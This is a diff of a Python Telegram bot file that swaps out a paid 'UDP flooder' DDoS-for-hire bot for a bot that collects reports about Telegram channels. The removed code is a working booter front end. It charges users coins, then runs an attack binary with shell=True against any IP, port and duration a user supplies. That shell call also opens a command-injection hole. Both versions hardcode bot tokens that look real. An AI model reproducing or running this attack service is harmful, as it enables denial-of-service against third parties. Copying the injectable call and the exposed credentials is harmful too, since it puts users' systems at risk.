@@ -1,210 +1,206 @@
-import asyncio
-import subprocess
-import json
-import time
-from telegram import Update, ReplyKeyboardMarkup
-from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
+import logging
+import re
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Updater, CommandHandler, CallbackQueryHandler, CallbackContext, MessageHandler, Filters
 
-# Define Admin ID
-ADMIN_ID = "8091696994"  # Replace with the actual Telegram user ID of the admin
+# Enable logging
+logging.basicConfig(
+    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
+    level=logging.INFO
+)
+logger = logging.getLogger(__name__)
 
-# In-memory database (persistent)
-DATA_FILE = "user_data.json"
-user_data = {}
-active_attacks = {}
-start_time = time.time()
+# Bot configuration
+TOKEN = "7244625688:AAFYZ_b5S8VQqMmrhu22XKy-QEtUqZBa4B8"
+ADMIN_IDS = [8091696994]  # Replace with your Telegram ID
 
-# Load user data from file
-def load_user_data():
-    global user_data
-    try:
-        with open(DATA_FILE, "r") as f:
-            user_data = json.load(f)
-    except FileNotFoundError:
-        user_data = {}
+# Report categories
+REPORT_CATEGORIES = {
+    "DDoS": "🚫 DDoS/Server Attack",
+    "ChildAbuse": "⚠️ Child Abuse/Illegal Content",
+    "BGMI_Hack": "🎮 BGMI/Free Fire Hacks",
+    "Spam": "📢 Spam/Scam",
+    "Piracy": "🏴‍☠️ Piracy/Illegal Sharing"
+}
 
-# Save user data to file
-def save_user_data():
-    with open(DATA_FILE, "w") as f:
-        json.dump(user_data, f, indent=4)
+# Database simulation (use a real database in production)
+reports_db = {}
 
-# Load data at startup
-load_user_data()
-
-# Start command with reply keyboard
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    keyboard = [
-        ["/attack", "/myinfo"],
-        ["/uptime", "/help"]
-    ]
+def extract_channel_info(text):
+    """Extract channel username or ID from various formats"""
+    # Handle @username format
+    if text.startswith('@'):
+        return text.strip()
     
-    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True, one_time_keyboard=False)
+    # Handle t.me/username or https://t.me/username
+    link_pattern = r'(?:https?://)?t\.me/([a-zA-Z0-9_]+)'
+    match = re.search(link_pattern, text)
+    if match:
+        return f"@{match.group(1)}"
+    
+    return None
 
-    welcome_message = """
-❄️ *WELCOME TO @RAHUL BHAI ULTIMATE UDP FLOODER* ❄️
-🔥 Yeh bot apko deta hai hacking ke maidan mein asli mazza! 🔥
-✨ *Key Features:* ✨
-🚀 Attack: /attack <ip> <port> <duration>
-🏦 Account check: /myinfo
-🛠️ Help: /help
-"""
-
-    await update.message.reply_text(welcome_message, parse_mode="Markdown", reply_markup=reply_markup)
-
-# Help command
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    help_message = """
-🛠️ RAHUL VIP DDOS Bot Help Menu 🛠️
-📜 Commands: 📜
-1️⃣ 🔥 /attack <ip> <port> <duration>
-2️⃣ 💳 /myinfo - Check balance.
-3️⃣ 🔧 /uptime - Bot uptime.
-4️⃣ ❓ /help - View help.
-5️⃣ 🗑️ /remove <user_id> - Admin only (remove user).
-🚨 *BOT REPLY NAA DE ISKA MATLAB KOI AUR ATTACK KAR RHA HAI!* 🚨
-"""
-    await update.message.reply_text(help_message, parse_mode="Markdown")
-
-# My Info command
-async def myinfo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user_id = str(update.effective_user.id)
-    balance = user_data.get(user_id, {}).get("balance", 0)
-    await update.message.reply_text(f"💰 Coins: {balance}\n😏 Status: Approved", parse_mode="Markdown")
-
-# Attack command
-async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user_id = str(update.effective_user.id)
-
-    if user_id not in user_data:
-        await update.message.reply_text("💰 Bhai, tere paas toh coins nahi hai! Pehle admin se baat kar.")
-        return
-
-    if user_id in active_attacks and time.time() < active_attacks[user_id]:
-        remaining_time = int(active_attacks[user_id] - time.time())
-        await update.message.reply_text(f"⚠️ Attack already running! {remaining_time} seconds left.")
-        return
-
-    if len(context.args) != 3:
-        await update.message.reply_text("❌ Usage: /attack <ip> <port> <duration>", parse_mode="Markdown")
-        return
-
-    ip, port = context.args[0], context.args[1]
-    try:
-        duration = int(context.args[2])
-        if duration > 300:
-            await update.message.reply_text("⛔ Maximum duration is 300 seconds.")
-            return
-    except ValueError:
-        await update.message.reply_text("❌ Duration must be a valid number.")
-        return
-
-    attack_cost = 5
-    if user_data[user_id]["balance"] < attack_cost:
-        await update.message.reply_text("💰 Coins insufficient! Contact admin.")
-        return
-
-    user_data[user_id]["balance"] -= attack_cost
-    save_user_data()
-
-    active_attacks[user_id] = time.time() + duration
-
-    await update.message.reply_text(
-        f"🚀 *Attack Started*\n💣 Target: {ip}:{port}\n⏳ Duration: {duration}s\n💰 Balance Left: {user_data[user_id]['balance']}",
-        parse_mode="Markdown"
+def start(update: Update, context: CallbackContext) -> None:
+    user = update.effective_user
+    update.message.reply_markdown_v2(
+        f"👋 Hello {user.mention_markdown_v2()}!\n\n"
+        "🔹 You can report harmful Telegram channels using:\n"
+        "- Channel username (@channelname)\n"
+        "- Channel link (t.me/channelname)\n"
+        "- Forwarded message from channel\n\n"
+        "📌 Supported report categories:\n"
+        "- DDoS/Server Attacks\n"
+        "- Child Abuse/Illegal Content\n"
+        "- Game Hacks/Cheats\n"
+        "- Spam/Scam\n"
+        "- Piracy"
     )
 
-    try:
-        process = subprocess.Popen(f"./Rahul {ip} {port} {duration}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        process.communicate()
-
-        if process.returncode != 0:
-            await update.message.reply_text("❌ Attack failed!")
-            del active_attacks[user_id]
-            return
-    except Exception as e:
-        await update.message.reply_text(f"❌ Attack error: {e}")
-        del active_attacks[user_id]
+def handle_message(update: Update, context: CallbackContext) -> None:
+    message = update.message
+    channel = None
+    
+    # Case 1: Text message containing username or link
+    if message.text:
+        channel = extract_channel_info(message.text)
+    
+    # Case 2: Forwarded message from channel
+    elif message.forward_from_chat and message.forward_from_chat.type == 'channel':
+        if message.forward_from_chat.username:
+            channel = f"@{message.forward_from_chat.username}"
+        else:
+            channel = f"ID:{message.forward_from_chat.id}"
+    
+    if not channel:
+        update.message.reply_text(
+            "❌ Please send:\n"
+            "- Channel username (@example)\n"
+            "- Channel link (t.me/example)\n"
+            "- Or forward a message from the channel"
+        )
         return
+    
+    context.user_data['channel_to_report'] = channel
+    show_report_categories(update)
 
-    while time.time() < active_attacks[user_id]:
-        await asyncio.sleep(1)
-
-    del active_attacks[user_id]
-
-    await update.message.reply_text(
-        f"✅ *[ATTACK FINISHED]* ✅\n\n"
-        f"💣 *Target:* `{ip}:{port}`\n"
-        f"🕒 *Duration:* {duration} seconds\n"
-        f"💰 *Remaining Coins:* {user_data[user_id]['balance']}\n"
-        f"🔥 *Attack complete! Chill kar!* 🚀",
-        parse_mode="Markdown"
-    )
-
-# Admin command to set user balance
-async def raja(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user_id = str(update.effective_user.id)
-
-    if user_id != ADMIN_ID:
-        await update.message.reply_text("❌ Only admin can use this command!")
-        return
-
-    if len(context.args) != 2:
-        await update.message.reply_text("Usage: /raja <user_id> <balance>")
-        return
-
-    target_user_id = context.args[0]
-    try:
-        balance = int(context.args[1])
-    except ValueError:
-        await update.message.reply_text("❌ Enter a valid numeric balance.")
-        return
-
-    user_data[target_user_id] = {"balance": balance}
-    save_user_data()
-    await update.message.reply_text(f"✅ User {target_user_id} set with balance {balance}.")
-
-# Admin command to remove a user
-async def remove_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    user_id = str(update.effective_user.id)
-
-    if user_id != ADMIN_ID:
-        await update.message.reply_text("❌ Only admin can remove users!")
-        return
-
-    if len(context.args) != 1:
-        await update.message.reply_text("Usage: /remove <user_id>")
-        return
-
-    target_user_id = context.args[0]
-
-    if target_user_id in user_data:
-        del user_data[target_user_id]
-        save_user_data()
-        await update.message.reply_text(f"🗑️ User {target_user_id} has been removed.")
+def show_report_categories(update: Update):
+    """Show inline keyboard with report categories"""
+    keyboard = []
+    row = []
+    
+    for code, label in REPORT_CATEGORIES.items():
+        row.append(InlineKeyboardButton(label, callback_data=f"report_{code}"))
+        if len(row) == 2:  # 2 buttons per row
+            keyboard.append(row)
+            row = []
+    
+    if row:  # Add remaining buttons if any
+        keyboard.append(row)
+    
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    if update.callback_query:
+        update.callback_query.edit_message_text(
+            "Select report category:",
+            reply_markup=reply_markup
+        )
     else:
-        await update.message.reply_text("❌ User not found.")
+        update.message.reply_text(
+            "Select report category:",
+            reply_markup=reply_markup
+        )
 
-# Uptime command
-async def uptime(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    elapsed_time = int(time.time() - start_time)
-    hours, rem = divmod(elapsed_time, 3600)
-    minutes, seconds = divmod(rem, 60)
-    await update.message.reply_text(f"⏰ Bot uptime: {hours}h {minutes}m {seconds}s.")
+def handle_category_selection(update: Update, context: CallbackContext):
+    query = update.callback_query
+    query.answer()
+    
+    _, category = query.data.split('_')
+    channel = context.user_data.get('channel_to_report')
+    
+    if not channel:
+        query.edit_message_text("❌ Error: Channel not found. Please try again.")
+        return
+    
+    # Store report
+    if channel not in reports_db:
+        reports_db[channel] = {cat: 0 for cat in REPORT_CATEGORIES}
+    
+    reports_db[channel][category] += 1
+    
+    # Notify admins
+    notify_admins(context, channel, category)
+    
+    query.edit_message_text(
+        f"✅ Report submitted!\n\n"
+        f"Channel: {channel}\n"
+        f"Category: {REPORT_CATEGORIES[category]}\n\n"
+        f"Thank you for making Telegram safer!"
+    )
 
-# Main function
+def notify_admins(context: CallbackContext, channel: str, category: str):
+    """Notify all admins about new report"""
+    report_count = reports_db[channel][category]
+    
+    message = (
+        f"⚠️ **New Report** ⚠️\n\n"
+        f"🔹 Channel: {channel}\n"
+        f"🔹 Category: {REPORT_CATEGORIES[category]}\n"
+        f"🔹 Total reports: {report_count}\n\n"
+        f"Handle with caution!"
+    )
+    
+    for admin_id in ADMIN_IDS:
+        try:
+            context.bot.send_message(
+                admin_id,
+                message,
+                parse_mode='Markdown'
+            )
+        except Exception as e:
+            logger.error(f"Failed to notify admin {admin_id}: {e}")
+
+def show_stats(update: Update, context: CallbackContext):
+    """Show report statistics (admin only)"""
+    if update.effective_user.id not in ADMIN_IDS:
+        update.message.reply_text("❌ You don't have permission to use this command.")
+        return
+    
+    if not reports_db:
+        update.message.reply_text("No reports yet.")
+        return
+    
+    stats = ["📊 **Report Statistics**\n"]
+    for channel, categories in reports_db.items():
+        channel_stats = [f"\n🔹 **{channel}**"]
+        for cat, count in categories.items():
+            if count > 0:
+                channel_stats.append(f"{REPORT_CATEGORIES[cat]}: {count}")
+        stats.append("\n".join(channel_stats))
+    
+    update.message.reply_markdown_v2("\n".join(stats))
+
 def main():
-    app = ApplicationBuilder().token("7996306021:AAH-JVpus8lkiBwp1MFiTrJxYTCQJ-TdLrE").build()
+    updater = Updater(TOKEN)
+    dispatcher = updater.dispatcher
 
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("help", help_command))
-    app.add_handler(CommandHandler("attack", attack))
-    app.add_handler(CommandHandler("raja", raja))
-    app.add_handler(CommandHandler("remove", remove_user))
-    app.add_handler(CommandHandler("myinfo", myinfo))
-    app.add_handler(CommandHandler("uptime", uptime))
+    # Commands
+    dispatcher.add_handler(CommandHandler("start", start))
+    dispatcher.add_handler(CommandHandler("stats", show_stats))
+    
+    # Message handlers
+    dispatcher.add_handler(MessageHandler(
+        Filters.text | Filters.forwarded,
+        handle_message
+    ))
+    
+    # Button handlers
+    dispatcher.add_handler(CallbackQueryHandler(
+        handle_category_selection,
+        pattern="^report_"
+    ))
 
-    print("Bot is running...")
-    app.run_polling()
+    updater.start_polling()
+    updater.idle()
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     main()
